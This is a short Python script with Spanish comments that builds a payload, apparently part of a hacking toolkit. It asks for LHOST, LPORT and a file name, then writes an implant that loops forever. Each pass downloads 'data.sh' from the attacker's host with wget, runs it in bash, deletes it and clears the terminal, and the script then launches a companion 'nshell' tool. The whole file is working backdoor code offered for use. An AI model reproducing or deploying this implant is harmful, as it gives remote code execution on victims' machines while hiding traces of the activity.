import os
import time

# Cambia al directorio 'output'
os.chdir("../output/")

# Espera 0.5 segundos
time.sleep(0.5)

# Solicita inputs al usuario
opt = input("LHOST: ")  # Dirección IP o hostname
opt2 = input("LPORT: ")  # Puerto
opt3 = input("name: ")   # Nombre del archivo

# Abre el archivo para escribir en él
with open(f"{opt3}.py", "w") as op:
    op.write(f"""import os
import time

# Iniciar servidor HTTP
os.system('python3 -m http.server {opt2} &')

def get(ip):
    # Descargar archivo data.txt desde el servidor
    os.system('wget http://{{}}:{opt2}/data.sh'.format(ip))
    
    # Esperar medio segundo
    time.sleep(0.5)
    
    # Ejecutar script bash y redirigir la salida al archivo 'data'
    os.system('bash data.sh >> data')
    
    # Eliminar los archivos descargados
    os.remove('data.sh')
    
    # Limpiar la terminal
    os.system('clear')

# Ciclo infinito para llamar a la función 'get'
while True:
    try:
        get('{opt}')
        time.sleep(0.5)
    except Exception:
        pass
""")

# Cambia al directorio 'nshell'
os.chdir("../nshell/")

os.system("python3 nshell.py")
